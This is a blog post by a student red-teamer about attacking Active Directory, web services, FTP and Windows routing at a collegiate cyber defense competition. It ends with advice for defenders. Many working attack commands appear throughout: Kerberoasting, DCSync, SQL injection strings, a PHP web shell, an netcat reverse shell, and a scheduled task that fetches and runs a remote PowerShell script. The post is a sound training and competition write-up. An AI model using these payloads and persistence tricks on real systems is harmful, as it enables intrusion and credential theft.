---
layout: post
title: "Red Team Operations at SEMO CCDC Invitational: Attacking Active Directory & Web Services"
date: 2025-01-18 14:30:00 -0500
categories: [Red Team, CCDC]
tags: [red-team, ccdc, active-directory, penetration-testing, offensive-security, competition]
description: "Lessons learned from serving on the Red Team at Southeast Missouri State University's CCDC Invitational, focusing on Windows Active Directory attacks, web exploitation, and network compromise."
image: semoredteam.jpeg
toc: true
math: false
---

## Competition Overview

Yesterday, I had the opportunity to serve on the Red Team for the Southeast Missouri State University CCDC Invitational. This was a fast-paced, intense competition where I focused on attacking:

- Windows Active Directory infrastructure
- Web services and applications
- FTP servers
- Windows routing and networking

Huge thanks to Samuel Brucker for the invite and for putting together a solid event that challenged both attackers and defenders.

## What is CCDC?

For those unfamiliar, the Collegiate Cyber Defense Competition (CCDC) is a cybersecurity competition where:

- **Blue Teams**: Defend a corporate network infrastructure
- **Red Teams**: Act as adversaries, attempting to compromise systems
- **White Team**: Manages scoring, injects, and rules
- **Green Team**: Simulates users and customer traffic

It's one of the most realistic cybersecurity competitions because it mimics real-world enterprise environments with:
- Legacy systems that can't be taken offline
- Business requirements that must be maintained
- Services that need to stay operational
- Limited time and resources

## Pre-Competition Preparation

### Toolset

Before the competition, I prepared a comprehensive red team toolkit:

```bash
# Core Tools
├── Network Discovery
│   ├── nmap
│   ├── masscan
│   └── netdiscover
├── Active Directory
│   ├── Impacket suite
│   ├── BloodHound
│   ├── PowerView
│   ├── Rubeus
│   └── Mimikatz
├── Web Exploitation
│   ├── Burp Suite
│   ├── sqlmap
│   ├── nikto
│   └── dirb
├── Credential Attacks
│   ├── Hydra
│   ├── Hashcat
│   └── John the Ripper
└── Post-Exploitation
    ├── Metasploit
    ├── Empire
    └── Covenant C2
```

### Attack Methodology

My general approach for CCDC competitions follows this pattern:

1. **Initial Reconnaissance** (15 minutes)
   - Network mapping
   - Service enumeration
   - Identifying low-hanging fruit

2. **Initial Access** (30 minutes)
   - Credential spraying
   - Web vulnerabilities
   - Exposed services

3. **Persistence** (Ongoing)
   - Backdoors
   - Scheduled tasks
   - Service modifications

4. **Privilege Escalation** (1 hour)
   - Local vulnerabilities
   - Credential harvesting
   - Token manipulation

5. **Lateral Movement** (Ongoing)
   - AD exploitation
   - Pass-the-hash
   - WMI/PSRemoting

6. **Maintain Access** (Throughout)
   - Multiple persistence mechanisms
   - Evading blue team detection
   - Adapting to defensive measures

## Active Directory Attacks

### Initial Enumeration

The first step in any AD attack is understanding the environment:

```powershell
# Domain enumeration with PowerView
Get-Domain
Get-DomainController
Get-DomainUser | Select samaccountname, description
Get-DomainGroup | Select samaccountname, description
Get-DomainComputer | Select dnshostname, operatingsystem
```

### Kerberoasting

One of the most effective attacks during the competition:

```powershell
# Request service tickets
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat

# Crack offline with Hashcat
hashcat -m 13100 tickets.txt rockyou.txt --force
```

**Result**: Compromised 2 service accounts within the first hour.

### AS-REP Roasting

Targeting accounts with pre-authentication disabled:

```bash
# Using Impacket
GetNPUsers.py -dc-ip 10.0.0.1 domain.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# Crack the hashes
hashcat -m 18200 asrep_hashes.txt rockyou.txt --force
```

**Result**: 1 additional account compromised.

### Password Spraying

After observing the blue team's activity patterns:

```python
#!/usr/bin/env python3
import requests
from datetime import datetime

def password_spray(users, password, delay=30):
    """
    Spray a single password across multiple accounts
    """
    for user in users:
        try:
            # Attempt authentication
            result = smb_auth(target, user, password)
            
            if result:
                print(f"[+] Valid credentials: {user}:{password}")
                return user, password
                
        except Exception as e:
            continue
        
        # Delay to avoid lockouts
        time.sleep(delay)
    
    return None

# Common weak passwords observed in CCDC
passwords = [
    "Welcome1!",
    "Password123!",
    "Spring2025!",
    "CompanyName123!"
]
```

**Key Insight**: Blue teams often focus on securing administrative accounts but neglect standard user accounts, which can be stepping stones for privilege escalation.

### DCSync Attack

After obtaining domain admin credentials:

```bash
# Using Impacket's secretsdump
secretsdump.py 'DOMAIN/Administrator:Password@dc01.domain.local'

# Or with Mimikatz
mimikatz # lsadump::dcsync /domain:domain.local /all /csv
```

This provided complete domain compromise and allowed maintaining persistent access even if the blue team changed passwords.

## Web Application Exploitation

### Reconnaissance

```bash
# Directory brute forcing
gobuster dir -u http://target.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

# Vulnerability scanning
nikto -h http://target.local -C all

# Technology fingerprinting
whatweb http://target.local -a 3
```

### SQL Injection

Found several vulnerable endpoints:

```sql
-- Testing for SQL injection
' OR '1'='1
admin'--
' UNION SELECT NULL,NULL,NULL--

-- Extracting database information
' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns--

-- Extracting credentials
' UNION SELECT username,password FROM users--
```

**Result**: Extracted user credentials from 3 different web applications.

### File Upload Vulnerabilities

```php
<?php
// Simple web shell
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
?>
```

Uploaded via unrestricted file upload forms, providing initial foothold on web servers.

### Command Injection

Found in several admin panels:

```bash
# Basic command injection
ping -c 1 127.0.0.1; whoami

# Reverse shell
ping -c 1 127.0.0.1; nc -e /bin/bash 10.0.0.100 4444

# URL encoded for web requests
ping%20-c%201%20127.0.0.1%3B%20whoami
```

## FTP Exploitation

### Anonymous Access

```bash
# Check for anonymous FTP
ftp target.local
# Username: anonymous
# Password: anonymous@

# Found in several cases:
# - Configuration files with credentials
# - Writable directories for backdoor upload
# - Sensitive documents
```

### Brute Force

```bash
# Using Hydra
hydra -L users.txt -P passwords.txt ftp://target.local

# Common weak credentials:
# ftp:ftp
# admin:admin
# user:password
```

### FTP Bounce Attacks

Leveraging FTP to scan internal network:

```bash
# Use FTP server as proxy for port scanning
nmap -b anonymous:password@ftp.target.local 10.0.0.0/24 -p 445
```

## Windows Routing Attacks

### Route Manipulation

Once administrative access was obtained:

```cmd
REM View current routes
route print

REM Add malicious routes
route ADD 10.10.10.0 MASK 255.255.255.0 10.0.0.100

REM Redirect traffic through compromised host
netsh interface ip set address "Local Area Connection" static 10.0.0.50 255.255.255.0 10.0.0.1
```

### ARP Poisoning

```bash
# Using arpspoof
arpspoof -i eth0 -t 10.0.0.50 10.0.0.1
arpspoof -i eth0 -t 10.0.0.1 10.0.0.50

# Capture traffic with Wireshark
wireshark -i eth0 -k -f "host 10.0.0.50"
```

**Result**: Captured plaintext credentials and session tokens from unencrypted traffic.

## Persistence Techniques

### Registry Run Keys

```cmd
REM Add backdoor to startup
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
```

### Scheduled Tasks

```powershell
# Create scheduled task for persistence
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.100/shell.ps1')"

$trigger = New-ScheduledTaskTrigger -AtStartup

Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -User "SYSTEM"
```

### Service Installation

```cmd
REM Create Windows service
sc create "Windows Defender Update" binPath= "C:\Windows\Temp\backdoor.exe" start= auto

REM Start the service
sc start "Windows Defender Update"
```

## Blue Team Observations

### What Blue Teams Did Well

1. **Quick Password Changes**: Immediately changed default credentials
2. **Service Monitoring**: Noticed suspicious process execution
3. **Firewall Rules**: Implemented network segmentation
4. **Log Monitoring**: Detected some exploitation attempts

### Common Blue Team Mistakes

1. **Incomplete Inventory**: Missed several exposed services
2. **Weak Passwords**: Despite changes, some passwords were still weak
3. **Patch Management**: Critical vulnerabilities remained unpatched
4. **Monitoring Gaps**: Failed to detect certain persistence mechanisms
5. **Panic Changes**: Made hasty configuration changes that broke services

## Lessons for Defenders

Based on attacking these systems, here's my advice for blue teams:

### Immediate Actions (First 30 Minutes)

1. **Change ALL default credentials** (not just admin)
2. **Disable unnecessary services**
3. **Enable Windows Firewall** with strict rules
4. **Take inventory** of all systems and services
5. **Enable detailed logging**

### Short-Term (First 2 Hours)

1. **Implement network segmentation**
2. **Deploy monitoring tools** (Sysmon, Splunk, etc.)
3. **Harden Active Directory**
   - Disable LLMNR/NBT-NS
   - Enable SMB signing
   - Implement tiered administration
4. **Patch critical vulnerabilities**
5. **Document everything**

### Ongoing

1. **Monitor logs continuously**
2. **Hunt for IOCs** (Indicators of Compromise)
3. **Verify persistence** hasn't been established
4. **Test disaster recovery** procedures
5. **Communicate with team**

## Teaching Opportunities

One of the best parts of this competition was seeing newer members of the Indiana Tech Cyber Warriors team get real competition experience. Competition pressure is completely different from lab environments:

- **Time constraints** force prioritization
- **Real opponents** adapt to your defenses
- **Service availability** requirements prevent "scorched earth" defensive tactics
- **Team coordination** becomes critical

These are skills that can't be learned from books or practice ranges alone.

## Red Team Tactics Observed

### Effective Techniques

1. **Patience**: Waiting for blue teams to make mistakes
2. **Persistence**: Multiple backdoors = harder to remove
3. **Stealth**: Low-and-slow approach avoided detection longer
4. **Adaptation**: Changing tactics when defenders caught on
5. **Documentation**: Keeping track of compromised credentials and access

### What Didn't Work

1. **Noisy scans**: Aggressive scanning alerted defenders quickly
2. **Single persistence**: Easy to detect and remove
3. **Predictable tactics**: Defenders learned patterns
4. **Poor OPSEC**: Leaving obvious traces

## Competition Statistics

```
My Attack Statistics:
├── Initial Access: 8 systems
├── Privilege Escalation: 6 systems
├── Credentials Harvested: 24 accounts
├── Persistence Established: 12 mechanisms
├── Services Disrupted: 3 (within rules)
└── Blue Team Detection: ~40% of attacks

Time Breakdown:
├── Reconnaissance: 20%
├── Exploitation: 35%
├── Post-Exploitation: 25%
├── Persistence: 15%
└── Documentation: 5%
```

## Tools Worth Mentioning

### New Tools I Tried

1. **Sliver C2**: Modern alternative to Cobalt Strike
2. **Kerbrute**: Fast Kerberos username enumeration
3. **CrackMapExec**: Swiss army knife for pentesting networks

### Classic Tools That Still Work

1. **Impacket**: Essential for Windows environments
2. **Mimikatz**: Credential extraction
3. **Nmap**: Network discovery and enumeration

## Conclusion

Competing on the Red Team at the SEMO CCDC Invitational was an excellent experience. Key takeaways:

1. **Fundamentals Matter**: Basic hygiene prevents most attacks
2. **Defense is Hard**: Blue teams have a difficult job
3. **Persistence Wins**: Multiple access points = longer compromise
4. **Learn Continuously**: Every competition teaches something new

Thanks again to Samuel Brucker and the SEMO team for hosting a great event. Also proud of the Indiana Tech Cyber Warriors recruits who got to experience competition pressure and learn from it.

Looking forward to the next competition!

---

*Note: All techniques described are for educational purposes and authorized competition use only. Unauthorized computer access is illegal.*
